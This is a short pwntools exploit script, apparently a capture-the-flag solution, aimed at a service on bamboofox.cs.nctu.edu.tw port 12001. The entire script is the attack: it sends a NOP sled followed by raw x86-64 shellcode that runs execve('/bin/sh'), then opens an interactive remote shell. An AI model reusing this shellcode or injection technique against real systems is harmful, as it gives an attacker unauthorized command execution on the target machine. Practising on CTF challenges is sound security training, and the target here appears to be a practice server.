#coding=utf-8
from pwn import *

r = remote('bamboofox.cs.nctu.edu.tw', 12001)

payload = '\x90' * (0x1000 - 40) + '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
r.sendline(payload)
r.interactive()
